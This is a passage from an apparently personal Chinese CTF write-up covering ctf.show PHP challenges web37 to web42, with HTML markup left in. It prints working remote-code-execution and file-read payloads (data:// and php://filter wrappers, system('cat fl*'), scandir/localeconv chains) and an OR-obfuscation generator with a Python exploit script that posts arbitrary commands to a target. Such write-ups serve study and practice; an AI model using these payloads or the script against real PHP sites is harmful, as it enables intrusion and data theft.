punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里使用了include函数，我们来看一下PHP的include函数：</p><p>include函数用于包含并运行指定文件，与require函数几乎一样（除了处理失败的方式不同，）对于include_once和require_once也是包含并运行，但其指定文件只能被包含一次，PHP会检查是否有多次包含该文件，若有，则不执行</p><p>对于其对于包含文件的位置的查找方式，详见PHP文档：<a href="https://www.php.net/manual/zh/function.include.php">include文档</a>,这里只用知道他是干什么的就好了，简单对文件包含的漏洞做一个总结</p><p>通过include文档可以看到：</p><p><img src="/images/image-20201214214256272.png"></p><p>文件包含支持封装协议，也就是说，我们可以通过在url中使用这些封装协议来完成更多的事情，这其中也就存在了很多的可以进行攻击的点</p><p><a href="https://www.php.net/manual/zh/wrappers.php">支持的协议和封装协议</a> （文档）</p><blockquote><ul><li><a href="https://www.php.net/manual/zh/wrappers.file.php">file://</a> — 访问本地文件系统</li><li><a href="https://www.php.net/manual/zh/wrappers.http.php">http://</a> — 访问 HTTP(s) 网址</li><li><a href="https://www.php.net/manual/zh/wrappers.ftp.php">ftp://</a> — 访问 FTP(s) URLs</li><li><a href="https://www.php.net/manual/zh/wrappers.php.php">php://</a> — 访问各个输入/输出流（I/O streams）</li><li><a href="https://www.php.net/manual/zh/wrappers.compression.php">zlib://</a> — 压缩流</li><li><a href="https://www.php.net/manual/zh/wrappers.data.php">data://</a> — 数据（RFC 2397）</li><li><a href="https://www.php.net/manual/zh/wrappers.glob.php">glob://</a> — 查找匹配的文件路径模式</li><li><a href="https://www.php.net/manual/zh/wrappers.phar.php">phar://</a> — PHP 归档</li><li><a href="https://www.php.net/manual/zh/wrappers.ssh2.php">ssh2://</a> — Secure Shell 2</li><li><a href="https://www.php.net/manual/zh/wrappers.rar.php">rar://</a> — RAR</li><li><a href="https://www.php.net/manual/zh/wrappers.audio.php">ogg://</a> — 音频流</li><li><a href="https://www.php.net/manual/zh/wrappers.expect.php">expect://</a> — 处理交互式的流</li></ul></blockquote><p>这里有一个前人总结的部分方法：</p><p><img src="/images/image-20210114181853207.png"></p><p>回到题目，过滤了flag，大小写无法绕过，那么使用*进行绕过，使用data://</p><p>payload:</p><pre class="line-numbers language-none"><code class="language-none">?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&quot;cat fl*&quot;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可得到flag：flag{aa0d4389-f830-4985-9653-11ca2dac828b}    </p><p><strong><em>不知道为什么不能用input来进行cat输出，试过了不行，需要搞明白</em></strong></p><p>这里附上Smi1e师傅写的一篇文章，各个协议写的很清楚</p><p><a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">这是链接</a></p><p>下面个人对其中的一些我认为比较重要的点进行一点记录</p><p><strong>php:// 访问各个输入/输出流（I/O streams），在ctf中我们会时长使用到两个协议：php://filter和php://input，其中php://filter用于读取源码，php://input用于执行php代码。</strong></p><ul><li>php://filter</li><li>php://filter`是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</li></ul><p>我们经常可以在文件包含的题目里看到这样的payload：</p><pre class="line-numbers language-none"><code class="language-none">?c&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>该payload的作用是以base64编码的方式读取flag.php的内容，对其进行一个解读：</p><p>这里的read是读取的过滤器，这里的过滤器为convert.base64-encode，如字面意思，把输入流进行base64编码，resource就是要读取的内容。</p><pre class="line-numbers language-none"><code class="language-none">resource&#x3D;&lt;要过滤的数据流&gt;     这个参数是必须的。它指定了你要筛选过滤的数据流。read&#x3D;&lt;读链的筛选列表&gt;         该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。write&#x3D;&lt;写链的筛选列表&gt;    该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。&lt;；两个链的筛选列表&gt;        任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>除了convert.base64-encode，还有很多的过滤器，，有字符串过滤器、转换过滤器、压缩过滤器、加密过滤器，具体描述见链接，<a href="https://www.php.net/manual/zh/filters.php">过滤器</a></p><ul><li>php://input</li></ul><p>php://input 是个可以访问请求的原始数据的只读流,可以读取到post没有解析的原始数据, 将post请求中的数据作为PHP代码执行。因为它不依赖于特定的 php.ini 指令。<br>注：enctype=”multipart/form-data” 的时候 php://input 是无效的。</p><p>所以本题使用php://input 无效的原因很可能就是这里</p><ul><li><p>data://</p><p>data:资源类型;编码,内容,数据流封装器,当allow_url_include 打开的时候，任意文件包含就会成为任意命令执行</p><p>PHP.ini：<br>data://协议必须双在on才能正常使用；<br>allow_url_fopen ：on<br>allow_url_include：on<br>php 版本大于等于 php5.2</p></li><li><p>zip://, bzip2://, zlib://协议</p></li></ul><blockquote><p>PHP.ini：<br>zip://, bzip2://, zlib://协议在双off的情况下也可以正常使用；<br>allow_url_fopen ：off/on<br>allow_url_include：off/on</p></blockquote><pre class="line-numbers language-none"><code class="language-none">3个封装协议，都是直接打开压缩文件。compress.zlib:&#x2F;&#x2F;file.gz - 处理的是 &#39;.gz&#39; 后缀的压缩包compress.bzip2:&#x2F;&#x2F;file.bz2 - 处理的是 &#39;.bz2&#39; 后缀的压缩包zip:&#x2F;&#x2F;archive.zip#dir&#x2F;file.txt - 处理的是 &#39;.zip&#39; 后缀的压缩包里的文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名</p><ul><li>zip://</li></ul><p>php 版本大于等于 php5.3.0<br>使用方法：<br><code>zip://archive.zip#dir/file.txt</code><br>zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]**<br>要用绝对路径+url编码#</p><p>大概记录到这里，大致对文件包含有一定的了解了，在后续的练习中进行详细了解</p><h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 05:23:36# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token comment">//flag in flag.php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|php|file/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤了flag,php,file，上一道的payload中的php被过滤掉了，对PHP语句进行一次base64机密即可，payload：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmwqIik7Pz4&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 06:13:21# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token comment">//flag in flag.php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤了flag在include的时候加上了后缀.php这样如果按照之前的方式进行会变为包含文件flag.php.php出题者想的应该是这样是无法进行读取的，要用别的方法，但发现用37题的payload就可以打通了。。。<del>不知道是在想什么，我们做题家是这样的，做完就跑，原理不管</del>，</p><p>看了一下hint，</p><pre class="line-numbers language-none"><code class="language-none">data:&#x2F;&#x2F;text&#x2F;plain, 这样就相当于执行了php语句 .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么作用<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>懂了，算是对开发进行提醒吧，这样做并不能有效的进行过滤，没用，</p><h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 06:03:36# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\'|\"|\,|\&lt;|\.|\>|\/|\?|\\\\/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对数字和一些符号如单引双引号进行了过滤，也过滤了冒号，那这些协议就不能用了，但是没有过滤分号，看来还是可以操作的？没见过这么操作，不懂，看wp了，哈哈哈。</p><p>最开始使用到session_id()，修改session内容为我们想要的命令，使用函数调用，实现执行语句的目的</p><p><img src="/images/image-20210117124553903.png"></p><p>payload：<code>?c=session_start();system(session_id());</code></p><p>发现可以执行，会列出有flag.php,index.php</p><p>但如果按照这个思路继续的话是将session内容改为flag.php，然后使用height_file(session_id())来进行查看，但是不行的，因为在PHP版本 5.5 -7.1.9均可以执行，因为session_id规定为0-9，a-z,A-Z,中的字符。在5.5以下及7.1以上均无法写入除此之外的内容。这里的PHP版本不支持，所以该方法不行。</p><p>但还是可以进行记录</p><ul><li>session_start():会创建新会话或者重用现有会话。 如果通过 GET 或者 POST 方式，或者使用 cookie 提交了会话 ID， 则会重用现有会话</li><li>session_id()： 可以用来获取/设置 当前会话 ID。</li><li>具体详见<a href="https://www.php.net/manual/zh/ref.session.php">php_session</a></li></ul><p>所以最开始的payload是首先重用当前会话，然后调用session_id，</p><p>本题需要使用到其它解法：</p><p>记录payload</p><p>:<code>?c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</code></p><p>对函数进行解析：</p><ul><li><p>localeconv():返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)</p></li><li><p>pos(): 返回数组中的当前元素的值。</p></li><li><p>array_reverse()：数组逆序</p></li><li><p>scandir()：获取目录下的文件</p></li><li><p>next()： 函数将内部指针指向数组中的下一个元素，并输出。</p></li></ul><p><strong>首先通过 pos(localeconv())得到点号，因为scandir(’.’)表示得到当前目录下的文件，所以<br>scandir(pos(localeconv()))就能得到flag.php了</strong></p><p><img src="/images/image-20210120132328568.png"></p><p>我们想要第二个，所以将数组逆序，再用next就可以得到flag.php，</p><p><img src="/images/image-20210120132633144.png"></p><h3 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: 羽# @Date:   2020-09-05 20:31:22# @Last Modified by:   h1xa# @Last Modified time: 2020-09-05 22:40:07# @email: 1341963450@qq.com# @link: https://ctf.show*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i'</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo(<span class="token interpolation"><span class="token variable">$c</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>完全不会，看wp：<a href="https://blog.csdn.net/miuzzx/article/details/108569080">wp</a></p><p>对$、+、-、^、~进行了过滤，让异或，自增，取反等无法执行，值留下了一个可用符号<code>|</code></p><p>我们可以尝试从ascii为0-255的字符中，找到或运算能得到我们可用的字符的字符</p><p>wp给出了脚本：</p><p><strong>rce_or.php</strong>:从进行异或的字符中排除掉被过滤的，然后在判断异或得到的字符是否为可见字符,传递参数getflag</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"rce_or.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span><span class="token number">256</span> <span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#转换为16进制</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$preg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_i</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_j</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token class-name">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">32</span><span class="token operator">&amp;</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">126</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token variable">$contents</span><span class="token operator">.</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span><span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>exp.py</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> urllib<span class="token keyword">from</span> sys <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> osos<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"php rce_or.php"</span><span class="token punctuation">)</span>  <span class="token comment">#没有将php写入环境变量需手动运行</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token operator">*</span><span class="token number">50</span><span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'USER：python exp.py &lt;url>'</span><span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"eg：  python exp.py http://ctf.show/"</span><span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token operator">*</span><span class="token number">50</span><span class="token punctuation">)</span>   exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>url<span class="token operator">=</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">action</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>   s1<span class="token operator">=</span><span class="token string">""</span>   s2<span class="token operator">=</span><span class="token string">""</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> arg<span class="token punctuation">:</span>       f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"rce_or.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>       <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>           t<span class="token operator">=</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token keyword">if</span> t<span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">:</span>               <span class="token keyword">break</span>           <span class="token keyword">if</span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span>i<span class="token punctuation">:</span>               <span class="token comment">#print(i)</span>               s1<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>               s2<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>               <span class="token keyword">break</span>       f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   output<span class="token operator">=</span><span class="token string">"(\""</span><span class="token operator">+</span>s1<span class="token operator">+</span><span class="token string">"\"|\""</span><span class="token operator">+</span>s2<span class="token operator">+</span><span class="token string">"\")"</span>   <span class="token keyword">return</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>   <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>   param<span class="token operator">=</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\n[+] your function："</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">+</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"[+] your command："</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   data<span class="token operator">=</span><span class="token punctuation">&#123;</span>       <span class="token string">'c'</span><span class="token punctuation">:</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>param<span class="token punctuation">)</span>       <span class="token punctuation">&#125;</span>   r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[*] result:\n"</span><span class="token operator">+</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用法 <code>python exp.py &lt;url&gt;</code></p><p><img src="/images/image-20210124180613425.png"></p><p>这样就能得到flag了。。。但我还没弄懂具体原理，需要再看看，但这俩脚本可以在以后遇见或运算符<code>|</code>绕过时进行修改使用。</p><h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified 